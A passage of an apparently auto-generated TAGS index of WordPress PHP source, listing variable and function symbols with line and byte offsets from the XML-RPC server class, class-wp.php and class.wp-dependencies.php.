		$password   = $args[3];password3530,102892
		$content     = $args[4];content3531,102918
		$publish     = $args[5];publish3532,102945
		$actual_post = wp_get_single_post($post_ID,ARRAY_A);actual_post3539,103100
		$post_title = xmlrpc_getposttitle($content);post_title3554,103654
		$post_category = xmlrpc_getpostcategory($content);post_category3555,103701
		$post_content = xmlrpc_removepostdata($content);post_content3556,103754
		$postdata = compact('ID', 'post_content', 'post_title', 'post_category', 'post_status', 'post_excerpt');postdata3558,103806
		$result = wp_update_post($postdata);result3560,103914
	function blogger_deletePost($args) {blogger_deletePost3580,104364
		$post_ID     = (int) $args[1];post_ID3583,104427
		$username  = $args[2];username3584,104460
		$password   = $args[3];password3585,104485
		$publish     = $args[4];publish3586,104511
		$actual_post = wp_get_single_post($post_ID,ARRAY_A);actual_post3593,104668
		$result = wp_delete_post($post_ID);result3601,104989
	function mw_newPost($args) {mw_newPost3650,106128
		$blog_ID     = (int) $args[0];blog_ID3653,106183
		$username  = $args[1];username3654,106216
		$password   = $args[2];password3655,106241
		$content_struct = $args[3];content_struct3656,106267
		$publish     = isset( $args[4] ) ? $args[4] : 0;publish3657,106297
		$page_template = '';page_template3664,106478
					$cap  = 'publish_pages';cap3668,106622
					$cap  = 'publish_pages';cap3670,106754
					$cap = 'edit_pages';cap3672,106793
				$error_message = __( 'Sorry, you are not allowed to publish pages on this site.' );error_message3673,106819
				$post_type = 'page';post_type3674,106907
					$page_template = $content_struct['wp_page_template'];page_template3676,106989
					$cap  = 'publish_posts';cap3679,107125
					$cap  = 'publish_posts';cap3681,107257
					$cap = 'edit_posts';cap3683,107296
				$error_message = __( 'Sorry, you are not allowed to publish posts on this site.' );error_message3684,107322
				$post_type = 'post';post_type3685,107410
				$cap  = 'publish_posts';cap3692,107592
				$cap  = 'publish_posts';cap3694,107721
				$cap = 'edit_posts';cap3696,107758
			$error_message = __( 'Sorry, you are not allowed to publish posts on this site.' );error_message3697,107783
			$post_type = 'post';post_type3698,107870
		$post_name = "";post_name3714,108429
			$post_name = $content_struct['wp_slug'];post_name3716,108491
			$post_password = $content_struct['wp_password'];post_password3720,108626
			$post_parent = $content_struct['wp_page_parent_id'];post_parent3724,108781
			$menu_order = $content_struct['wp_page_order'];menu_order3728,108936
		$post_author = $user->ID;post_author3730,108988
			$author = get_userdata( $content_struct['wp_author_id'] );author3747,109619
			$post_author = $content_struct['wp_author_id'];post_author3750,109762
		$post_title = isset( $content_struct['title'] ) ? $content_struct['title'] : null;post_title3753,109818
		$post_content = isset( $content_struct['description'] ) ? $content_struct['description'] : null;post_content3754,109903
		$post_status = $publish ? 'publish' : 'draft';post_status3756,110003
					$post_status = $content_struct["{$post_type}_status"];post_status3764,110245
					$post_status = $publish ? 'publish' : 'draft';post_status3767,110330
		$post_excerpt = isset($content_struct['mt_excerpt']) ? $content_struct['mt_excerpt'] : null;post_excerpt3772,110404
		$post_more = isset($content_struct['mt_text_more']) ? $content_struct['mt_text_more'] : null;post_more3773,110499
		$tags_input = isset($content_struct['mt_keywords']) ? $content_struct['mt_keywords'] : null;tags_input3775,110596
						$comment_status = 'closed';comment_status3781,110883
						$comment_status = 'open';comment_status3784,110948
						$comment_status = get_option('default_comment_status');comment_status3787,111007
						$comment_status = 'closed';comment_status3794,111186
						$comment_status = 'open';comment_status3797,111246
						$comment_status = get_option('default_comment_status');comment_status3800,111305
			$comment_status = get_option('default_comment_status');comment_status3805,111402
						$ping_status = 'closed';ping_status3812,111648
						$ping_status = 'open';ping_status3815,111710
						$ping_status = get_option('default_ping_status');ping_status3818,111766
						$ping_status = 'closed';ping_status3824,111923
						$ping_status = 'open';ping_status3827,111980
						$ping_status = get_option('default_ping_status');ping_status3830,112036
			$ping_status = get_option('default_ping_status');ping_status3835,112127
			$post_content = $post_content . '<!--more-->' . $post_more;post_content3839,112205
		$to_ping = null;to_ping3841,112269
			$to_ping = $content_struct['mt_tb_ping_urls'];to_ping3843,112343
				$to_ping = implode(' ', $to_ping);to_ping3845,112422
			$dateCreated = rtrim( $content_struct['date_created_gmt']->getIso(), 'Z' ) . 'Z';dateCreated3851,112641
			$dateCreated = $content_struct['dateCreated']->getIso();dateCreated3853,112779
			$post_date = get_date_from_gmt(iso8601_to_datetime($dateCreated));post_date3856,112874
			$post_date_gmt = iso8601_to_datetime($dateCreated, 'GMT');post_date_gmt3857,112944
			$post_date = current_time('mysql');post_date3859,113017
			$post_date_gmt = current_time('mysql', 1);post_date_gmt3860,113056
		$post_category = array();post_category3863,113107
			$catnames = $content_struct['categories'];catnames3865,113185
		$postdata = compact('post_author', 'post_date', 'post_date_gmt', 'post_content', 'post_title', 'post_category', 'post_status', 'post_excerpt', 'comment_status', 'ping_status', 'to_ping', 'post_type', 'post_name', 'post_password', 'post_parent', 'menu_order', 'tags_input', 'page_template');postdata3874,113356
		$post_ID = $postdata['ID'] = get_default_post_to_edit( $post_type, true )->ID;post_ID3876,113650
		if ( $post_type == 'post' && isset( $content_struct['sticky'] ) ) {post_type3879,113762
		$thisEnclosure = isset($content_struct['enclosure']) ? $content_struct['enclosure'] : null;thisEnclosure3897,114402
		$post_ID = wp_insert_post( $postdata, true );post_ID3907,114857
	function add_enclosure_if_new($post_ID, $enclosure) {add_enclosure_if_new3919,115220
			$encstring = $enclosure['url'] . "\n" . $enclosure['length'] . "\n" . $enclosure['type'];encstring3922,115404
			$found = false;found3923,115497
			foreach ( (array) get_post_custom($post_ID) as $key => $val) {key3924,115516
							$found = true;found3928,115685
	function attach_uploads( $post_ID, $post_content ) {attach_uploads3947,115987
		$attachments = $wpdb->get_results( "SELECT ID, guid FROM {$wpdb->posts} WHERE post_parent = '0' AND post_type = 'attachment'" );attachments3951,116089
	function mw_editPost($args) {mw_editPost3968,116589
		$post_ID        = (int) $args[0];post_ID3972,116646
		$username       = $args[1];username3973,116682
		$password       = $args[2];password3974,116712
		$content_struct = $args[3];content_struct3975,116742
		$publish        = isset( $args[4] ) ? $args[4] : 0;publish3976,116772
		if ( ! $user = $this->login($username, $password) )user3978,116827
		$postdata = wp_get_single_post( $post_ID, ARRAY_A );postdata3983,116958
		$post_name = "";post_name4014,118343
		$post_name = $postdata['post_name'];post_name4015,118362
			$post_name = $content_struct['wp_slug'];post_name4017,118444
			$post_password = $content_struct['wp_password'];post_password4021,118579
			$post_parent = $content_struct['wp_page_parent_id'];post_parent4025,118731
			$menu_order = $content_struct['wp_page_order'];menu_order4029,118883
			$page_template = $content_struct['wp_page_template'];page_template4032,119015
		$post_author = $postdata['post_author'];post_author4034,119073
			$post_author = $content_struct['wp_author_id'];post_author4051,119739
						$comment_status = 'closed';comment_status4058,119986
						$comment_status = 'open';comment_status4061,120051
						$comment_status = get_option('default_comment_status');comment_status4064,120110
						$comment_status = 'closed';comment_status4071,120289
						$comment_status = 'open';comment_status4074,120349
						$comment_status = get_option('default_comment_status');comment_status4077,120408
						$ping_status = 'closed';ping_status4087,120681
						$ping_status = 'open';ping_status4090,120743
						$ping_status = get_option('default_ping_status');ping_status4093,120799
						$ping_status = 'closed';ping_status4099,120956
						$ping_status = 'open';ping_status4102,121013
						$ping_status = get_option('default_ping_status');ping_status4105,121069
			$post_title =  $content_struct['title'];post_title4112,121197
			$post_content = $content_struct['description'];post_content4115,121291
		$post_category = array();post_category4117,121343
			$catnames = $content_struct['categories'];catnames4119,121421
			$post_excerpt =  $content_struct['mt_excerpt'];post_excerpt4128,121639
		$post_more = isset( $content_struct['mt_text_more'] ) ? $content_struct['mt_text_more'] : null;post_more4130,121691
		$post_status = $publish ? 'publish' : 'draft';post_status4132,121790
					$post_status = $content_struct["{$post_type}_status"];post_status4139,122030
					$post_status = $publish ? 'publish' : 'draft';post_status4142,122115
		$tags_input = isset( $content_struct['mt_keywords'] ) ? $content_struct['mt_keywords'] : null;tags_input4147,122189
			$post_content = $post_content . "<!--more-->" . $post_more;post_content4157,122660
		$to_ping = null;to_ping4159,122724
			$to_ping = $content_struct['mt_tb_ping_urls'];to_ping4161,122798
				$to_ping = implode(' ', $to_ping);to_ping4163,122877
			$dateCreated = rtrim( $content_struct['date_created_gmt']->getIso(), 'Z' ) . 'Z';dateCreated4169,123096
			$dateCreated = $content_struct['dateCreated']->getIso();dateCreated4171,123234
			$post_date = get_date_from_gmt(iso8601_to_datetime($dateCreated));post_date4174,123329
			$post_date_gmt = iso8601_to_datetime($dateCreated, 'GMT');post_date_gmt4175,123399
			$post_date     = $postdata['post_date'];post_date4177,123472
			$post_date_gmt = $postdata['post_date_gmt'];post_date_gmt4178,123516
		$newpost = compact('ID', 'post_content', 'post_title', 'post_category', 'post_status', 'post_excerpt', 'comment_status', 'ping_status', 'post_date', 'post_date_gmt', 'to_ping', 'post_name', 'post_password', 'post_parent', 'menu_order', 'post_author', 'tags_input', 'page_template');newpost4182,123609
		$result = wp_update_post($newpost, true);result4184,123895
		if ( $post_type == 'post' && isset( $content_struct['sticky'] ) ) {post_type4192,124183
		$thisEnclosure = isset($content_struct['enclosure']) ? $content_struct['enclosure'] : null;thisEnclosure4214,124994
	function mw_getPost($args) {mw_getPost4237,125648
		$post_ID     = (int) $args[0];post_ID4241,125704
		$username  = $args[1];username4242,125737
		$password   = $args[2];password4243,125762
		$postdata = wp_get_single_post($post_ID, ARRAY_A);postdata4248,125867
			$post_date = $this->_convert_date( $postdata['post_date'] );post_date4258,126217
			$post_date_gmt = $this->_convert_date_gmt( $postdata['post_date_gmt'],  $postdata['post_date'] );post_date_gmt4259,126281
			$post_modified = $this->_convert_date( $postdata['post_modified'] );post_modified4260,126382
			$post_modified_gmt = $this->_convert_date_gmt( $postdata['post_modified_gmt'], $postdata['post_modified'] );post_modified_gmt4261,126454
			$categories = array();categories4263,126567
			$catids = wp_get_post_categories($post_ID);catids4264,126593
			$tagnames = array();tagnames4268,126713
			$tags = wp_get_post_tags( $post_ID );tags4269,126737
				$tagnames = implode( ', ', $tagnames );tagnames4273,126867
				$tagnames = '';tagnames4275,126923
			$post = get_extended($postdata['post_content']);post4278,126949
			$link = post_permalink($postdata['ID']);link4279,127001
			$author = get_userdata($postdata['post_author']);author4282,127073
			$allow_comments = ('open' == $postdata['comment_status']) ? 1 : 0;allow_comments4284,127127
			$allow_pings = ('open' == $postdata['ping_status']) ? 1 : 0;allow_pings4285,127197
			$post_format = get_post_format( $post_ID );post_format4292,127416
				$post_format = 'standard';post_format4294,127495
			$sticky = false;sticky4296,127527
				$sticky = true;sticky4298,127579
			$enclosure = array();enclosure4300,127600
			foreach ( (array) get_post_custom($post_ID) as $key => $val) {key4301,127625
						$encdata = explode("\n", $enc);encdata4304,127762
			$resp = array(resp4313,127997
	function mw_getRecentPosts($args) {mw_getRecentPosts4361,129488
		$blog_ID     = (int) $args[0];blog_ID4365,129551
		$username  = $args[1];username4366,129584
		$password   = $args[2];password4367,129609
			$query = array( 'numberposts' => absint( $args[3] ) );query4369,129662
			$query = array();query4371,129727
		$posts_list = wp_get_recent_posts( $query );posts_list4378,129885
			$post_date = $this->_convert_date( $entry['post_date'] );post_date4387,130083
			$post_date_gmt = $this->_convert_date_gmt( $entry['post_date_gmt'], $entry['post_date'] );post_date_gmt4388,130144
			$post_modified = $this->_convert_date( $entry['post_modified'] );post_modified4389,130238
			$post_modified_gmt = $this->_convert_date_gmt( $entry['post_modified_gmt'], $entry['post_modified'] );post_modified_gmt4390,130307
			$categories = array();categories4392,130414
			$catids = wp_get_post_categories($entry['ID']);catids4393,130440
			$tagnames = array();tagnames4397,130566
			$tags = wp_get_post_tags( $entry['ID'] );tags4398,130590
				$tagnames = implode( ', ', $tagnames );tagnames4403,130732
				$tagnames = '';tagnames4405,130788
			$post = get_extended($entry['post_content']);post4408,130814
			$link = post_permalink($entry['ID']);link4409,130863
			$author = get_userdata($entry['post_author']);author4412,130937
			$allow_comments = ('open' == $entry['comment_status']) ? 1 : 0;allow_comments4414,130988
			$allow_pings = ('open' == $entry['ping_status']) ? 1 : 0;allow_pings4415,131055
			$post_format = get_post_format( $entry['ID'] );post_format4422,131265
				$post_format = 'standard';post_format4424,131348
			$entry_index = count( $struct ) - 1;entry_index4455,132474
		$recent_posts = array();recent_posts4459,132610
		for ( $j=0; $j<count($struct); $j++ ) {j4460,132637
	function mw_getCategories($args) {mw_getCategories4475,132903
		$blog_ID     = (int) $args[0];blog_ID4479,132965
		$username  = $args[1];username4480,132998
		$password   = $args[2];password4481,133023
		$categories_struct = array();categories_struct4491,133350
		if ( $cats = get_categories(array('get' => 'all')) ) {cats4493,133383
	function mw_newMediaObject($args) {mw_newMediaObject4522,134196
		$blog_ID     = (int) $args[0];blog_ID4525,134250
		$username  = $wpdb->escape($args[1]);username4526,134283
		$password   = $wpdb->escape($args[2]);password4527,134323
		$data        = $args[3];data4528,134364
		$name = sanitize_file_name( $data['name'] );name4530,134392
		$type = $data['type'];type4531,134439
		$bits = $data['bits'];bits4532,134464
			$this->error = new IXR_Error( 401, __( 'You do not have permission to upload files.' ) );error4540,134671
		if ( $upload_err = apply_filters( 'pre_upload_error', false ) )upload_err4544,134793
			$old_file = $wpdb->get_row("old_file4549,135012
			$filename = preg_replace('/^wpid\d+-/', '', $name);filename4561,135311
			$name = "wpid{$old_file->ID}-{$filename}";name4562,135366
		$upload = wp_upload_bits($name, null, $bits);upload4565,135417
			$errorString = sprintf(__('Could not write file %1$s (%2$s)'), $name, $upload['error']);errorString4567,135502
		$post_id = 0;post_id4572,135703
		$attachment = array(attachment4573,135719
		$id = wp_insert_attachment( $attachment, $upload[ 'file' ], $post_id );id4583,135940
		$struct = array(struct4588,136181
	function mt_getRecentPostTitles($args) {mt_getRecentPostTitles4609,136621
		$blog_ID     = (int) $args[0];blog_ID4613,136689
		$username  = $args[1];username4614,136722
		$password   = $args[2];password4615,136747
			$query = array( 'numberposts' => absint( $args[3] ) );query4617,136800
			$query = array();query4619,136865
		$posts_list = wp_get_recent_posts( $query );posts_list4626,137020
			$this->error = new IXR_Error(500, __('Either there are no posts, or something went wrong.'));error4629,137092
		$struct = array();struct4633,137218
			$post_date = $this->_convert_date( $entry['post_date'] );post_date4639,137348
			$post_date_gmt = $this->_convert_date_gmt( $entry['post_date_gmt'], $entry['post_date'] );post_date_gmt4640,137409
		$recent_posts = array();recent_posts4653,137771
		for ( $j=0; $j<count($struct); $j++ ) {j4654,137798
	function mt_getCategoryList($args) {mt_getCategoryList4669,138056
		$blog_ID     = (int) $args[0];blog_ID4673,138120
		$username  = $args[1];username4674,138153
		$password   = $args[2];password4675,138178
		$categories_struct = array();categories_struct4685,138499
		if ( $cats = get_categories(array('hide_empty' => 0, 'hierarchical' => 0)) ) {cats4687,138532
	function mt_getPostCategories($args) {mt_getPostCategories4707,138934
		$post_ID     = (int) $args[0];post_ID4711,139000
		$username  = $args[1];username4712,139033
		$password   = $args[2];password4713,139058
		$categories = array();categories4726,139436
		$catids = wp_get_post_categories(intval($post_ID));catids4727,139461
		$isPrimary = true;isPrimary4729,139571
			$isPrimary = false;isPrimary4736,139769
	function mt_setPostCategories($args) {mt_setPostCategories4750,139966
		$post_ID     = (int) $args[0];post_ID4754,140032
		$username  = $args[1];username4755,140065
		$password   = $args[2];password4756,140090
		$categories  = $args[3];categories4757,140116
	function mt_supportedMethods($args) {mt_supportedMethods4787,140783
		$supported_methods = array();supported_methods4791,140875
		foreach ( $this->methods as $key => $value ) {key4792,140907
	function mt_supportedTextFilters($args) {mt_supportedTextFilters4806,141179
	function mt_getTrackbackPings($args) {mt_getTrackbackPings4819,141478
		$post_ID = intval($args);post_ID4823,141536
		$actual_post = wp_get_single_post($post_ID, ARRAY_A);actual_post4827,141618
		$comments = $wpdb->get_results( $wpdb->prepare("SELECT comment_author_url, comment_content, comment_author_IP, comment_type FROM $wpdb->comments WHERE comment_post_ID = %d", $post_ID) );comments4832,141757
		$trackback_pings = array();trackback_pings4837,141987
				$content = $comment->comment_content;content4840,142105
				$title = substr($content, 8, (strpos($content, '</strong>') - 8));title4841,142147
	function mt_publishPost($args) {mt_publishPost4861,142564
		$post_ID     = (int) $args[0];post_ID4865,142624
		$username  = $args[1];username4866,142657
		$password   = $args[2];password4867,142682
		$postdata = wp_get_single_post($post_ID, ARRAY_A);postdata4874,142834
		$cats = wp_get_post_categories($post_ID);cats4884,143192
		$result = wp_update_post($postdata);result4888,143303
	function pingback_ping($args) {pingback_ping4905,143582
		$pagelinkedfrom = $args[0];pagelinkedfrom4912,143703
		$pagelinkedto   = $args[1];pagelinkedto4913,143733
		$title = '';title4915,143764
		$pagelinkedfrom = str_replace('&amp;', '&', $pagelinkedfrom);pagelinkedfrom4917,143780
		$pagelinkedto = str_replace('&amp;', '&', $pagelinkedto);pagelinkedto4918,143844
		$pagelinkedto = str_replace('&', '&amp;', $pagelinkedto);pagelinkedto4919,143904
		$pos1 = strpos($pagelinkedto, str_replace(array('http://www.','http://','https://www.','https://'), '', get_option('home')));pos14922,144013
		$urltest = parse_url($pagelinkedto);urltest4929,144381
		if ( $post_ID = url_to_postid($pagelinkedto) ) {post_ID4930,144420
			$way = 'url_to_postid()';way4931,144471
			$blah = explode('/', $match[0]);blah4934,144624
			$post_ID = (int) $blah[1];post_ID4935,144660
			$way = 'from the path';way4936,144690
			$blah = explode('=', $match[0]);blah4939,144841
			$post_ID = (int) $blah[1];post_ID4940,144877
			$way = 'from the querystring';way4941,144907
				$post_ID = (int) $urltest['fragment'];post_ID4946,145112
				$way = 'from the fragment (numeric)';way4947,145155
				$post_ID = preg_replace('/[^0-9]+/', '', $urltest['fragment']);post_ID4950,145307
				$way = 'from the fragment (post-###)';way4951,145375
				$title = preg_replace('/[^a-z0-9]/i', '.', $urltest['fragment']);title4954,145524
				$sql = $wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE post_title RLIKE %s", like_escape( $title ) );sql4955,145594
				$way = 'from the fragment (title)';way4960,145852
		$post_ID = (int) $post_ID;post_ID4966,146136
		$post = get_post($post_ID);post4968,146166
		if ( $post_ID == url_to_postid($pagelinkedfrom) )post_ID4973,146399
		$linea = wp_remote_fopen( $pagelinkedfrom );linea4988,147211
		$linea = apply_filters('pre_remote_source', $linea, $pagelinkedto);linea4992,147345
		$linea = str_replace('<!DOC', '<DOC', $linea);linea4995,147454
		$linea = preg_replace( '/[\s\r\n\t]+/', ' ', $linea ); // normalize spaceslinea4996,147503
		$linea = preg_replace( "/ <(h1|h2|h3|h4|h5|h6|p|th|td|li|dt|dd|pre|caption|input|textarea|button|body)[^>]*>/", "\n\n", $linea );linea4997,147580
		$title = $matchtitle[1];title5000,147779
		$linea = strip_tags( $linea, '<a>' ); // just keep the tag we needlinea5004,147905
		$p = explode( "\n\n", $linea );p5006,147975
		$preg_target = preg_quote($pagelinkedto, '|');preg_target5008,148010
				$excerpt = preg_replace('|\</?wpcontext\>|', '', $para);excerpt5020,148511
				$marker = '<wpcontext>'.$context[1].'</wpcontext>';    // set up our markermarker5026,148704
				$excerpt= str_replace($context[0], $marker, $excerpt); // swap out the link for our markerexcerpt5027,148784
				$excerpt = strip_tags($excerpt, '<wpcontext>');        // strip all tags but our context markerexcerpt5028,148879
				$excerpt = trim($excerpt);excerpt5029,148979
				$preg_marker = preg_quote($marker, '|');preg_marker5030,149010
				$excerpt = preg_replace("|.*?\s(.{0,100}$preg_marker.{0,100})\s.*|s", '$1', $excerpt);excerpt5031,149055
				$excerpt = strip_tags($excerpt); // YES, again, to remove the marker wrapperexcerpt5032,149146
		$pagelinkedfrom = str_replace('&', '&amp;', $pagelinkedfrom);pagelinkedfrom5040,149431
		$context = '[...] ' . esc_html( $excerpt ) . ' [...]';context5042,149496
		$pagelinkedfrom = $wpdb->escape( $pagelinkedfrom );pagelinkedfrom5043,149553
		$comment_post_ID = (int) $post_ID;comment_post_ID5045,149608
		$comment_author = $title;comment_author5046,149645
		$comment_author_email = '';comment_author_email5047,149673
		$comment_author_url = $pagelinkedfrom;comment_author_url5049,149737
		$comment_content = $context;comment_content5050,149778
		$comment_type = 'pingback';comment_type5052,149844
		$commentdata = compact('comment_post_ID', 'comment_author', 'comment_author_url', 'comment_author_email', 'comment_content', 'comment_type');commentdata5054,149875
		$comment_ID = wp_new_comment($commentdata);comment_ID5056,150020
	function pingback_extensions_getPingbacks($args) {pingback_extensions_getPingbacks5072,150465
		$url = $args;url5080,150625
		$post_ID = url_to_postid($url);post_ID5082,150642
		$actual_post = wp_get_single_post($post_ID, ARRAY_A);actual_post5088,150942
		$comments = $wpdb->get_results( $wpdb->prepare("SELECT comment_author_url, comment_content, comment_author_IP, comment_type FROM $wpdb->comments WHERE comment_post_ID = %d", $post_ID) );comments5095,151148
		$pingbacks = array();pingbacks5100,151378

wordpress/wp-includes/class-wp.php,8643
class WP {WP8,93
	var $public_query_vars = array('m', 'p', 'posts', 'w', 'cat', 'withcomments', 'withoutcomments', 's', 'search', 'exact', 'sentence', 'calendar', 'page', 'paged', 'more', 'tb', 'pb', 'author', 'order', 'orderby', 'year', 'monthnum', 'day', 'hour', 'minute', 'second', 'name', 'category_name', 'tag', 'feed', 'author_name', 'static', 'pagename', 'page_id', 'error', 'comments_popup', 'attachment', 'attachment_id', 'subpost', 'subpost_id', 'preview', 'robots', 'taxonomy', 'term', 'cpage', 'post_type');public_query_vars18,242
	var $public_query_vars = array('m', 'p', 'posts', 'w', 'cat', 'withcomments', 'withoutcomments', 's', 'search', 'exact', 'sentence', 'calendar', 'page', 'paged', 'more', 'tb', 'pb', 'author', 'order', 'orderby', 'year', 'monthnum', 'day', 'hour', 'minute', 'second', 'name', 'category_name', 'tag', 'feed', 'author_name', 'static', 'pagename', 'page_id', 'error', 'comments_popup', 'attachment', 'attachment_id', 'subpost', 'subpost_id', 'preview', 'robots', 'taxonomy', 'term', 'cpage', 'post_type');public_query_vars18,242
	var $private_query_vars = array('offset', 'posts_per_page', 'posts_per_archive_page', 'showposts', 'nopaging', 'post_type', 'post_status', 'category__in', 'category__not_in', 'category__and', 'tag__in', 'tag__not_in', 'tag__and', 'tag_slug__in', 'tag_slug__and', 'tag_id', 'post_mime_type', 'perm', 'comments_per_page', 'post__in', 'post__not_in');private_query_vars28,867
	var $private_query_vars = array('offset', 'posts_per_page', 'posts_per_archive_page', 'showposts', 'nopaging', 'post_type', 'post_status', 'category__in', 'category__not_in', 'category__and', 'tag__in', 'tag__not_in', 'tag__and', 'tag_slug__in', 'tag_slug__and', 'tag_id', 'post_mime_type', 'perm', 'comments_per_page', 'post__in', 'post__not_in');private_query_vars28,867
	var $extra_query_vars = array();extra_query_vars36,1307
	var $extra_query_vars = array();extra_query_vars36,1307
	var $query_vars;query_vars44,1449
	var $query_string;query_string52,1561
	var $request;request60,1661
	var $matched_rule;matched_rule68,1762
	var $matched_query;matched_query76,1869
	var $did_permalink = false;did_permalink84,1975
	var $did_permalink = false;did_permalink84,1975
	function add_query_var($qv) {add_query_var93,2131
	function set_query_var($key, $value) {set_query_var106,2417
	function parse_request($extra_query_vars = '') {parse_request120,2809
		$this->query_vars = array();query_vars123,2882
		$post_type_query_vars = array();post_type_query_vars124,2913
			$this->extra_query_vars = & $extra_query_vars;extra_query_vars127,2986
		$rewrite = $wp_rewrite->wp_rewrite_rules();rewrite134,3226
			$error = '404';error138,3358
			$this->did_permalink = true;did_permalink139,3377
				$pathinfo = $_SERVER['PATH_INFO'];pathinfo142,3449
				$pathinfo = '';pathinfo144,3496
			$pathinfo_array = explode('?', $pathinfo);pathinfo_array145,3516
			$pathinfo = str_replace("%", "%25", $pathinfo_array[0]);pathinfo146,3562
			$req_uri = $_SERVER['REQUEST_URI'];req_uri147,3622
			$req_uri_array = explode('?', $req_uri);req_uri_array148,3661
			$req_uri = $req_uri_array[0];req_uri149,3705
			$self = $_SERVER['PHP_SELF'];self150,3738
			$home_path = parse_url(home_url());home_path151,3771
				$home_path = $home_path['path'];home_path153,3846
				$home_path = '';home_path155,3891
			$home_path = trim($home_path, '/');home_path156,3912
			$req_uri = str_replace($pathinfo, '', $req_uri);req_uri162,4186
			$req_uri = trim($req_uri, '/');req_uri163,4238
			$req_uri = preg_replace("|^$home_path|", '', $req_uri);req_uri164,4273
			$req_uri = trim($req_uri, '/');req_uri165,4332
			$pathinfo = trim($pathinfo, '/');pathinfo166,4367
			$pathinfo = preg_replace("|^$home_path|", '', $pathinfo);pathinfo167,4404
			$pathinfo = trim($pathinfo, '/');pathinfo168,4465
			$self = trim($self, '/');self169,4502
			$self = preg_replace("|^$home_path|", '', $self);self170,4531
			$self = trim($self, '/');self171,4584
				$request = $pathinfo;request176,4816
				if ( $req_uri == $wp_rewrite->index )req_uri179,4956
					$req_uri = '';req_uri180,4998
				$request = $req_uri;request181,5018
			$this->request = $request;request184,5049
			$request_match = $request;request_match187,5104
					$this->matched_rule = '$';matched_rule191,5264
					$query = $rewrite['$'];query192,5296
					$matches = array('');matches193,5325
				foreach ( (array) $rewrite as $match => $query ) {match196,5402
						$request_match = $req_uri . '/' . $request;request_match199,5633
						$this->matched_rule = $match;matched_rule211,6123
				$query = preg_replace("!^.+\?!", '', $query);query219,6283
				$query = addslashes(WP_MatchesMapRegex::apply($query, $matches));query222,6390
				$this->matched_query = $query;matched_query224,6461
			if ( empty($request) || $req_uri == $self || strpos($_SERVER['PHP_SELF'], 'wp-admin/') !== false ) {req_uri236,6789
				$this->did_permalink = false;did_permalink243,7069
		$this->public_query_vars = apply_filters('query_vars', $this->public_query_vars);public_query_vars247,7113
		foreach ( $GLOBALS['wp_post_types'] as $post_type => $t )post_type249,7198
					foreach ( $this->query_vars[$wpvar] as $vkey => $v ) {vkey267,7967
		foreach ( $GLOBALS['wp_taxonomies'] as $taxonomy => $t )taxonomy282,8375
			$queryable_post_types = get_post_types( array('publicly_queryable' => true) );queryable_post_types288,8728
		$this->query_vars = apply_filters('request', $this->query_vars);query_vars305,9359
	function send_headers() {send_headers318,9741
		$headers = array('X-Pingback' => get_bloginfo('pingback_url'));headers319,9768
		$status = null;status320,9834
		$exit_required = false;exit_required321,9852
			$headers = array_merge($headers, wp_get_nocache_headers());headers324,9908
			$status = 404;status326,10056
				$headers = array_merge($headers, wp_get_nocache_headers());headers328,10105
				$wp_last_modified = mysql2date('D, d M Y H:i:s', get_lastcommentmodified('GMT'), 0).' GMT';wp_last_modified345,10905
				$wp_last_modified = mysql2date('D, d M Y H:i:s', get_lastpostmodified('GMT'), 0).' GMT';wp_last_modified347,11009
			$wp_etag = '"' . md5($wp_last_modified) . '"';wp_etag348,11102
				$client_etag = stripslashes(stripslashes($_SERVER['HTTP_IF_NONE_MATCH']));client_etag354,11315
			else $client_etag = false;client_etag355,11394
			$client_last_modified = empty($_SERVER['HTTP_IF_MODIFIED_SINCE']) ? '' : trim($_SERVER['HTTP_IF_MODIFIED_SINCE']);client_last_modified357,11425
			$client_modified_timestamp = $client_last_modified ? strtotime($client_last_modified) : 0;client_modified_timestamp359,11621
			$wp_modified_timestamp = strtotime($wp_last_modified);wp_modified_timestamp362,11775
				$status = 304;status367,12076
				$exit_required = true;exit_required368,12095
		$headers = apply_filters('wp_headers', $headers, $this);headers372,12132
		foreach( (array) $headers as $name => $field_value )name376,12249
	function build_query_string() {build_query_string393,12665
		$this->query_string = '';query_string394,12698
			$this->query_string = apply_filters('query_string', $this->query_string);query_string406,13258
	function register_globals() {register_globals424,13844
		foreach ( (array) $wp_query->query_vars as $key => $value) {key427,13955
	function init() {init447,14416
	function query_posts() {query_posts457,14571
	function handle_404() {handle_404474,15066
	function main($query_args = '') {main520,16234
 * Helper class to remove the need to use eval to replace $matches[] in query strings.to533,16479
class WP_MatchesMapRegex {WP_MatchesMapRegex537,16589
	var $_matches;_matches544,16687
	var $output;output552,16782
	var $_subject;_subject560,16928
	var $_pattern = '(\$matches\[[1-9]+[0-9]*\])'; // magic number_pattern567,17025
	var $_pattern = '(\$matches\[[1-9]+[0-9]*\])'; // magic number_pattern567,17025
	function WP_MatchesMapRegex($subject, $matches) {WP_MatchesMapRegex576,17227
		$this->_subject = $subject;_subject577,17278
		$this->_matches = $matches;_matches578,17308
		$this->output = $this->_map();output579,17338
	 * static helper function to ease useto585,17429
	public static function apply($subject, $matches) {apply592,17604
		$oSelf = new WP_MatchesMapRegex($subject, $matches);oSelf593,17656
	function _map() {_map603,17819
		$callback = array(&$this, 'callback');callback604,17838
	function callback($matches) {callback615,18098
		$index = intval(substr($matches[0], 9, -1));index616,18129

wordpress/wp-includes/class.wp-dependencies.php,3329
class WP_Dependencies {WP_Dependencies19,300
	var $registered = array();registered20,324
	var $registered = array();registered20,324
	var $queue = array();queue21,352
	var $queue = array();queue21,352
	var $to_do = array();to_do22,375
	var $to_do = array();to_do22,375
	var $done = array();done23,398
	var $done = array();done23,398
	var $args = array();args24,420
	var $args = array();args24,420
	var $groups = array();groups25,442
	var $groups = array();groups25,442
	var $group = 0;group26,466
	var $group = 0;group26,466
	function do_items( $handles = false, $group = false ) {do_items36,803
	function do_items( $handles = false, $group = false ) {handles36,803
		$handles = false === $handles ? $this->queue : (array) $handles;handles38,989
		foreach( $this->to_do as $key => $handle ) {key41,1088
	function do_item( $handle ) {do_item59,1487
	 * @param bool $recursion Used internally when function calls itselfcalls70,1809
	function all_deps( $handles, $recursion = false, $group = false ) {all_deps72,1884
	function all_deps( $handles, $recursion = false, $group = false ) {recursion72,1884
			$handle_parts = explode('?', $handle);handle_parts77,2045
			$handle = $handle_parts[0];handle78,2087
			$queued = in_array($handle, $this->to_do, true);queued79,2118
			$moved = $this->set_group( $handle, $recursion, $group );moved84,2249
			$keep_going = true;keep_going89,2396
				$keep_going = false; // Script doesn't existkeep_going91,2464
				$keep_going = false; // Script requires deps which don't exist (not a necessary check. efficiency?)keep_going93,2639
				$keep_going = false; // Script requires deps which don't existkeep_going95,2860
